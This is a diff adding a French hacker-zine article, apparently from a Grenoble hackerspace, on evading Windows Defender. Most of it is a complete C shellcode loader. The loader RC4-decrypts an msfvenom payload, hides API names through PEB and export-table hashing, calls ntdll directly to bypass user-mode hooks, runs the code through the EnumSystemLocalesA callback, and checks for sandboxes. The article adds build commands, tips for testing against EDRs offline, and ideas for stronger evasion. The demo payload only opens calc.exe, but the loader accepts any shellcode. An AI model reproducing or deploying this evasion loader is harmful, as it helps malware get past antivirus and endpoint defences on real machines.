@@ -1,0 +1,432 @@
+  _______      ___       ______      ______    
+ /" _   "\    /. ")     /    " \    /    " \   
+(: (_/  :|   /:  /     // ____  \  // ____  \  
+ \____/ |)  //  /___  /  /    ) :)/  /    ) :) 
+    _\  '| (   / _  \(: (____/ //(: (____/ //  
+   /" \__|\|:   /_) :)\        /  \        /   
+  (________)\_______/  \"_____/    \"_____/ bauds   	
+
+┌───────────────────────────────┐
+│ ISSUE No 4 - Aout 2026 01.TXT └──────────────────────────────────────────────┐
+| Techniques d'évasion sur Windows Defender                                    |
+| Beemo <nflatrea@mailo.com>                                                   |
+| GRENOBLE HACKERSPACE                                                         |
+└──────────────────────────────────────────────────────────────────────────────┘⠀
+
+            ___                              _                    
+           | __|   __ __   __ _     ___     (_)     ___    _ _    
+           | _|    \ V /  / _` |   (_-<     | |    / _ \  | ' \   
+           |___|   _\_/_  \__,_|   /__/_   _|_|_   \___/  |_||_|  
+         _|"""""|_|"""""|_|"""""|_|"""""|_|"""""|_|"""""|_|"""""| 
+         "`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'  
+
+          [>] Techniques d'évasion sur Windows Defender
+     					                   Beemo
+
+
+[0x00] :: INTRODUCTION
+
+J'ai récemment eu l'occasion de discuter maldev et après réflexion, me suis dis
+qu'il serait intéressant de discuter de certaines techniques d'évasions.
+
+PwnBot m'a récemment montré un PoC qu'il c'était amusé à faire, qui combine 
+plusieurs techniques et des ptites astuces qui marchent. Me suis pas fais chié 
+et j'ai pris son shellcode comme exemple. 
+
+Le PoC compile en vrac,
+
+  - Du chiffrement RC4 sur le payload,
+  - Une résolution des APIs via PEB + hash (pas de str en clair)
+  - Des appels directs à ntdll pour éviter les crochets en user-mode
+  - Transition RW->RX (pas de RWX, les EDR adorent ça)
+  - De l'exécution via callback EnumSystemLocalesA (pas de call direct)
+  - Une détection de sandbox basée sur le timing
+
+[0x01] :: EL FAMOSO
+
+/*
+ * Compil (Linux):
+ *   x86_64-w64-mingw32-gcc main.c -o runner.exe -mwindows -s -O2
+ * Compil (MSVC):
+ *   cl main.c /Fe:runner.exe /O2 /GS-
+ */
+
+#include <windows.h>
+#include <winternl.h>
+
+/* ------------------------------------------------------------------ */
+/* djb2 hashes                        */
+/* ------------------------------------------------------------------ */
+#define HASH_NTDLL_DLL                  0xe91aad51UL
+#define HASH_KERNEL32_DLL               0x3e003875UL
+#define HASH_NtAllocateVirtualMemory    0xf0146ce2UL
+#define HASH_NtProtectVirtualMemory     0xcd363694UL
+#define HASH_EnumSystemLocalesA         0x7ced7069UL
+
+/* ------------------------------------------------------------------ */
+/* djb2                                                                */
+/* ------------------------------------------------------------------ */
+static DWORD djb2_a(const char *s) {
+    DWORD h = 5381;
+    while (*s) h = (h * 33) ^ (unsigned char)*s++;
+    return h;
+}
+
+static DWORD djb2_w(const WCHAR *s) {
+    DWORD h = 5381;
+    while (*s) {
+        WCHAR c = (*s >= L'A' && *s <= L'Z') ? *s + 32 : *s;
+        h = (h * 33) ^ (unsigned char)c;
+        s++;
+    }
+    return h;
+}
+
+/* ------------------------------------------------------------------ */
+/* LDR struct                                                       */
+/* ------------------------------------------------------------------ */
+typedef struct _MY_LDR_ENTRY {
+    LIST_ENTRY     InLoadOrderLinks;
+    LIST_ENTRY     InMemoryOrderLinks;
+    LIST_ENTRY     InInitializationOrderLinks;
+    PVOID          DllBase;
+    PVOID          EntryPoint;
+    ULONG          SizeOfImage;
+    UNICODE_STRING FullDllName;
+    UNICODE_STRING BaseDllName;
+} MY_LDR_ENTRY;
+
+/* ------------------------------------------------------------------ */
+/* PEB walk                                                             */
+/* ------------------------------------------------------------------ */
+static PVOID peb_get_module(DWORD target_hash) {
+    PPEB peb   = (PPEB)__readgsqword(0x60);
+    PLIST_ENTRY head = &peb->Ldr->InMemoryOrderModuleList;
+    PLIST_ENTRY curr = head->Flink;
+    while (curr != head) {
+        MY_LDR_ENTRY *e = CONTAINING_RECORD(curr, MY_LDR_ENTRY, InMemoryOrderLinks);
+        if (e->BaseDllName.Buffer && djb2_w(e->BaseDllName.Buffer) == target_hash)
+            return e->DllBase;
+        curr = curr->Flink;
+    }
+    return NULL;
+}
+
+/* ------------------------------------------------------------------ */
+/* EAT parser                                                           */
+/* ------------------------------------------------------------------ */
+static FARPROC eat_get_proc(PVOID base, DWORD target_hash) {
+    BYTE *b = (BYTE *)base;
+    IMAGE_DOS_HEADER      *dos = (IMAGE_DOS_HEADER *)b;
+    IMAGE_NT_HEADERS      *nt  = (IMAGE_NT_HEADERS *)(b + dos->e_lfanew);
+    IMAGE_EXPORT_DIRECTORY *ex = (IMAGE_EXPORT_DIRECTORY *)(b +
+        nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
+
+    DWORD *names    = (DWORD *)(b + ex->AddressOfNames);
+    WORD  *ords     = (WORD  *)(b + ex->AddressOfNameOrdinals);
+    DWORD *funcs    = (DWORD *)(b + ex->AddressOfFunctions);
+
+    for (DWORD i = 0; i < ex->NumberOfNames; i++) {
+        const char *name = (const char *)(b + names[i]);
+        if (djb2_a(name) == target_hash)
+            return (FARPROC)(b + funcs[ords[i]]);
+    }
+    return NULL;
+}
+
+/* ------------------------------------------------------------------ */
+/* API typedefs                                                         */
+/* ------------------------------------------------------------------ */
+typedef NTSTATUS (NTAPI *fnNtAllocateVirtualMemory)(
+    HANDLE, PVOID *, ULONG_PTR, PSIZE_T, ULONG, ULONG);
+
+typedef NTSTATUS (NTAPI *fnNtProtectVirtualMemory)(
+    HANDLE, PVOID *, PSIZE_T, ULONG, PULONG);
+
+typedef BOOL (WINAPI *fnEnumSystemLocalesA)(LOCALE_ENUMPROCA, DWORD);
+
+/* ------------------------------------------------------------------ */
+/* RC4                                                                  */
+/* ------------------------------------------------------------------ */
+static void rc4_crypt(unsigned char *key, int klen,
+                      unsigned char *data, int dlen) {
+    unsigned char S[256];
+    int i, j = 0;
+    for (i = 0; i < 256; i++) S[i] = (unsigned char)i;
+    for (i = 0; i < 256; i++) {
+        j = (j + S[i] + key[i % klen]) & 0xFF;
+        unsigned char t = S[i]; S[i] = S[j]; S[j] = t;
+    }
+    i = j = 0;
+    for (int k = 0; k < dlen; k++) {
+        i = (i + 1) & 0xFF;
+        j = (j + S[i]) & 0xFF;
+        unsigned char t = S[i]; S[i] = S[j]; S[j] = t;
+        data[k] ^= S[(S[i] + S[j]) & 0xFF];
+    }
+}
+
+/* ------------------------------------------------------------------ */
+/* Sandbox check: mesure si Sleep() dort vraiment                     */
+/* ------------------------------------------------------------------ */
+static BOOL sandbox_check(void) {
+    LARGE_INTEGER t1, t2, freq;
+    QueryPerformanceFrequency(&freq);
+    QueryPerformanceCounter(&t1);
+    Sleep(1500);
+    QueryPerformanceCounter(&t2);
+    LONGLONG elapsed_ms = (t2.QuadPart - t1.QuadPart) * 1000 / freq.QuadPart;
+    return (elapsed_ms >= 1400);  /* allow 100 ms tolerance */
+}
+
+/* ------------------------------------------------------------------ */
+/* RC4 key :: rien de caché ici, c'est pas notre but                  */
+/* ------------------------------------------------------------------ */
+static unsigned char KEY[] = {
+    0x4e, 0x61, 0xc3, 0x7f, 0x09, 0xb2, 0x55, 0xd8,
+    0xaa, 0x3c, 0x17, 0xe9, 0x72, 0x06, 0xbd, 0x41
+};
+
+/*
+ * RC4-chiffré windows/x64/exec CMD=calc.exe
+ */
+static unsigned char enc_sc[] = {
+    0x5f, 0xef, 0x3c, 0xd4, 0xe8, 0x16, 0xde, 0x11, 0x86, 0x6c, 0xdf, 0x05,
+    0xc9, 0x53, 0x86, 0x7e, 0x4a, 0xb6, 0xb0, 0xaf, 0x46, 0xee, 0xe2, 0xf1,
+    0x49, 0x5f, 0x6b, 0x89, 0xcf, 0x54, 0x11, 0x11, 0x83, 0x16, 0x41, 0x8b,
+    0x56, 0x4c, 0xba, 0x1d, 0x36, 0x50, 0xf8, 0xe3, 0xdf, 0x35, 0x26, 0x39,
+    0xa0, 0x3b, 0xb1, 0x54, 0x41, 0x2e, 0xf9, 0xb4, 0xf1, 0x0b, 0xd4, 0x72,
+    0xfe, 0xc4, 0x04, 0x76, 0x5d, 0xba, 0xd9, 0x8c, 0xa7, 0xea, 0xe8, 0x2a,
+    0xb9, 0x75, 0x1c, 0xe6, 0x8d, 0x0c, 0x80, 0xf6, 0x1b, 0xfb, 0x01, 0x80,
+    0x49, 0xca, 0x85, 0xf7, 0x32, 0xac, 0xf9, 0x7b, 0xec, 0x4f, 0xc7, 0x89,
+    0xec, 0x4e, 0xb9, 0x82, 0x3e, 0x0e, 0x27, 0x2a, 0x75, 0xf8, 0x3c, 0x73,
+    0x86, 0x28, 0x1a, 0x23, 0x22, 0x5f, 0x02, 0xed, 0x67, 0xe7, 0x65, 0xe9,
+    0xc8, 0x6a, 0xfc, 0x1a, 0x66, 0x2d, 0x57, 0xc4, 0x0f, 0x5d, 0x29, 0xd5,
+    0x09, 0xe3, 0xac, 0x76, 0x42, 0x70, 0x7d, 0x43, 0x6a, 0x09, 0xf7, 0xf0,
+    0x39, 0xd0, 0xf6, 0x94, 0x21, 0xb5, 0x14, 0x90, 0x43, 0x46, 0xff, 0xaf,
+    0xa9, 0x58, 0x97, 0xcd, 0x61, 0x7f, 0xc1, 0x14, 0x47, 0xf4, 0x8e, 0x60,
+    0x90, 0x3e, 0xb5, 0xae, 0x49, 0x08, 0x25, 0x80, 0x67, 0xe1, 0xbf, 0x8f,
+    0x13, 0x13, 0x91, 0x51, 0x77, 0xe1, 0x77, 0x3e, 0x97, 0xd6, 0x65, 0xe7,
+    0x41, 0x26, 0xeb, 0x90, 0x2f, 0xcf, 0x08, 0x34, 0x9e, 0xf5, 0xa1, 0x9a,
+    0x82, 0x66, 0xee, 0xf4, 0xab, 0xf8, 0x7c, 0xf8, 0xef, 0x3a, 0x0c, 0xb0,
+    0x96, 0xfc, 0x8a, 0x86, 0x9f, 0x93, 0x38, 0xdb, 0x9f, 0x72, 0x87, 0x80,
+    0x69, 0xb4, 0x35, 0x99, 0x58, 0x56, 0x81, 0xb5, 0x04, 0x81, 0x66, 0xa6,
+    0x94, 0x7c, 0xff, 0x5d, 0xce, 0xdc, 0x05, 0x89, 0x2d, 0x93, 0x4f, 0x9e,
+    0xde, 0x7b, 0x05, 0xef, 0xef, 0x49, 0x2e, 0x9b, 0xfa, 0xeb, 0xa4, 0x53,
+    0x7d, 0xda, 0x89, 0x09, 0x92, 0xb7, 0x98, 0xee, 0xb9, 0xd5, 0xdc, 0x6e,
+};
+
+int main(void) {
+ 
+    /* check sandbox */
+    if (!sandbox_check())
+        return 0;
+
+    /* Resolve ntdll + kernel32 depuis la PEB */
+    PVOID hNtdll = peb_get_module(HASH_NTDLL_DLL);
+    PVOID hK32   = peb_get_module(HASH_KERNEL32_DLL);
+    if (!hNtdll || !hK32) return 1;
+
+    /* Resolve Nt* depuis ntdll EAT (bypasses kernel32 hook layer) */
+    fnNtAllocateVirtualMemory NtAVM =
+        (fnNtAllocateVirtualMemory)eat_get_proc(hNtdll, HASH_NtAllocateVirtualMemory);
+    fnNtProtectVirtualMemory  NtPVM =
+        (fnNtProtectVirtualMemory) eat_get_proc(hNtdll, HASH_NtProtectVirtualMemory);
+    fnEnumSystemLocalesA      EnumSL =
+        (fnEnumSystemLocalesA)     eat_get_proc(hK32,   HASH_EnumSystemLocalesA);
+    if (!NtAVM || !NtPVM || !EnumSL) return 1;
+
+    /* Alloue RW via ntdll directement */
+    PVOID  buf = NULL;
+    SIZE_T len = sizeof(enc_sc);
+    NtAVM((HANDLE)-1, &buf, 0, &len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    if (!buf) return 1;
+
+    /* copie + RC4 decrypt */
+    for (SIZE_T i = 0; i < sizeof(enc_sc); i++)
+        ((BYTE*)buf)[i] = enc_sc[i];
+    rc4_crypt(KEY, sizeof(KEY), (unsigned char *)buf, (int)sizeof(enc_sc));
+
+    /* Flip RX via ntdll directement */
+    ULONG  old = 0;
+    SIZE_T region = sizeof(enc_sc);
+    NtPVM((HANDLE)-1, &buf, &region, PAGE_EXECUTE_READ, &old);
+
+    /* Execute via EnumSystemLocalesA callback pas de fn-ptr cast à poil */
+    EnumSL((LOCALE_ENUMPROCA)buf, 0);
+
+    return 0;
+}
+
+[0x02] :: COMPILATION ET TEST
+
+[>] Générer le shellcode:
+
+  $ msfvenom -p windows/x64/exec CMD=calc.exe -f raw > shellcode.bin
+  $ python3 gen_shellcode.py shellcode.bin // dérouillez vous pour le script
+  Copier la sortie "header" dans le code C.
+
+[>] Compiler sous linux:
+
+  $ x86_64-w64-mingw32-gcc main.c -o runner.exe -mwindows -s -O2
+
+[>] Compiler sous Windows/MSVC :
+
+  C:\> cl main.c /Fe:runner.exe /O2 /GS-
+
+[>] Test:
+  
+  - Vérifier que calc.exe s'ouvre.
+  - Vérifier que Windows Defender ne détecte rien (en mode déconnecté,
+    sinon il peut envoyer le fichier en cloud pour analyse et ça fait chier).
+  - Tester dans une VM avec un EDR (ex: CrowdStrike, SentinelOne) pour
+    voir si ça passe.
+
+[0x03] :: ANALYSE DU CODE
+
+┌---[1.1] Chiffrement RC4
+│
+│   Le payload (calc.exe) est chiffré avec RC4. La clé est définie dans KEY[] 
+│   et doit matcher avec celle utilisé pour générer le shellcode.
+│   Rien de révolutionnaire, mais ça évite les signatures statiques sur le 
+│   payload brut et c'est léger.
+│
+│   static unsigned char KEY[] = {0x4e, 0x61, ...};
+│   static unsigned char enc_sc[] = {0x5f, 0xef, ...};
+│
+│   La fonction rc4_crypt() est appelée pour déchiffrer le payload en
+│   mémoire après allocation.
+
+┌---[1.2] Résolution des DLLs via PEB
+│
+│   Pas d'appels à LoadLibrary() ou GetModuleHandle() ! On parcourt la
+│   PEB (Process Environment Block) pour trouver les bases des DLLs
+│   chargées. La fonction peb_get_module() utilise un hash djb2 sur le
+│   nom de la DLL (en Unicode) pour éviter les strings en clair.
+│
+│     PPEB peb = (PPEB)__readgsqword(0x60);
+│     PLIST_ENTRY curr = peb->Ldr->InMemoryOrderModuleList.Flink;
+│
+│   Les hashs sont prédéfinis :
+│     HASH_NTDLL_DLL     = 0xe91aad51
+│     HASH_KERNEL32_DLL  = 0x3e003875
+│
+│   Astuce : Les hashs sont calculés avec djb2_w() qui convertit les
+│   caractères en minuscules avant le hash. Pratique pour éviter les
+│   variations de casse.
+
+┌---[1.3] Résolution des APIs via EAT
+│
+│   Même principe pour les fonctions : on parse l'EAT (Export Address Table)
+│   des DLLs pour trouver l'adresse des fonctions ciblées. La fonction
+│   eat_get_proc() prend la base de la DLL et un hash de nom de fonction.
+│
+│     IMAGE_EXPORT_DIRECTORY *ex = ...;
+│     for (DWORD i = 0; i < ex->NumberOfNames; i++) {
+│         const char *name = (const char *)(b + names[i]);
+│         if (djb2_a(name) == target_hash) return (FARPROC)(b + funcs[...]);
+│     }
+│
+│   Les fonctions ciblées :
+│     NtAllocateVirtualMemory  (hash: 0xf0146ce2)
+│     NtProtectVirtualMemory   (hash: 0xcd363694)
+│     EnumSystemLocalesA       (hash: 0x7ced7069)
+│
+│   Pourquoi ces fonctions ?
+│   - NtAllocateVirtualMemory / NtProtectVirtualMemory : Appels directs à
+│     ntdll, contournent les hooks user-mode (ex: dans kernel32).
+│   - EnumSystemLocalesA : Utilisée pour exécuter le shellcode via un
+│     callback. Moins suspect qu'un call direct à un pointeur de fonction.
+
+┌---[1.4] Allocation et Protection de la Mémoire
+│
+│   On alloue de la mémoire en RW (Read-Write) avec NtAllocateVirtualMemory,
+│   puis on copie et déchiffre le payload dedans. Ensuite, on passe la page
+│   en RX (Read-eXecute) avec NtProtectVirtualMemory.
+│
+│     NtAVM((HANDLE)-1, &buf, 0, &len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+│     memcpy(buf, enc_sc, sizeof(enc_sc));
+│     rc4_crypt(KEY, sizeof(KEY), buf, sizeof(enc_sc));
+│     NtPVM((HANDLE)-1, &buf, &region, PAGE_EXECUTE_READ, &old);
+│
+│   Pourquoi pas RWX directement ? Dans le mille émile, Les solutions de 
+│   détection (EDR, AV) surveillent les allocations RWX (exécutable ET writable). 
+│   La transition RW->RX est plus discrète.
+
+┌---[1.5] Exécution via Callback
+│
+│   Pas de :
+│     ((void(*)())buf)();
+│
+│   À la place, on utilise EnumSystemLocalesA qui prend un pointeur de
+│   fonction (LOCALE_ENUMPROCA) en argument. Notre shellcode est casté en
+│   ce type et passé comme callback.
+│
+│     EnumSL((LOCALE_ENUMPROCA)buf, 0);
+│
+│   Ça évite les signatures sur les appels directs à des pointeurs de mémoire
+│   allouée. Pis EnumSystemLocalesA est une API légitime, donc moins surveillée.
+
+┌---[1.6] Détection de Sandbox
+│
+│   La fonction sandbox_check() mesure le temps écoulé pendant un Sleep(1500).
+│   Dans une sandbox, Sleep() est souvent "fast-forwardé", donc le temps
+│   réel écoulé sera bien inférieur à 1500ms.
+│
+│     QueryPerformanceCounter(&t1);
+│     Sleep(1500);
+│     QueryPerformanceCounter(&t2);
+│     elapsed_ms = (t2.QuadPart - t1.QuadPart) * 1000 / freq.QuadPart;
+│     return (elapsed_ms >= 1400);
+│
+│   Si la sandbox est détectée, le programme quitte silencieusement.
+│   Tolérance de 100ms pour les variations normales.
+
+
+[0x04] :: POURQUOI ÇA MARCHE (OU PAS)
+
+Pas de strings en clair (DLLs et APIs résolues via hash). Pas d'appels à 
+LoadLibrary/GetProcAddress (contourne les hooks). Pas de RWX (transition RW->RX).
+Une exécution via des callback légitimes, une détection de sandbox basique mais 
+qui fait le taff.
+
+Bon par contre, les hashs djb2 peuvent être calculés à l'envers par les AV/EDR.
+La détection de sandbox est basique (Sleep() seulement) faudrais ajouter des 
+checks (nbs de CPU, mémoire etc).
+
+Le payload est statique (calc.exe), mieux vaudrais quelque-chose de meta qui ce
+génère dynamiquement ou se télécharge.
+
+T'as pas non plus d'obfuscation du code lui-même, il manques quelques fonctions
+et conditions poubelles, des boucles inifies jamais appelés etc
+
+
+[0x05] :: CONCLUSION
+
+Le PoC nous montre qu'avec quelques techniques simples mais bien choisies, 
+on peut contourner les détections basiques de Windows Defender. 
+
+Bien évidemment, les EDRs modernes iront plus loin, mais c'est une bonne base 
+pour comprendre les mécanismes d'évasion. Le code est volontairement minimaliste
+pour être facile à comprendre et à modifier. 
+
+À vous de jouer, 
+
+[0x06] :: RÉFÉRENCES
+
+[>] PEB Walking :
+  - https://www.apriorit.com/dev-blog/367-anti-reverse-engineering-protection-techniques-to-use-before-releasing-software
+  - https://0xrick.github.io/win-internals/peb/
+[>] EAT Parsing :
+  - https://docs.microsoft.com/en-us/windows/win32/debug/pe-format#export-directory-table
+  - https://www.ired.team/miscellaneous-reversing-forensics/windows-kernel/in-depth-look-into-export-address-table-eat
+[>] Nt* APIs :
+  - https://undocumented.ntinternals.net/
+  - https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/ntddk/nf-ntddk-ntallocatevirtualmemory
+[>] RC4 :
+  - https://en.wikipedia.org/wiki/RC4
+[>] Sandbox Evasion :
+  - https://www.hynek.me/articles/virtual-machine-detection/
+  - https://anti-debug.checkpoint.com/
+
+[0xFF] :: EOF
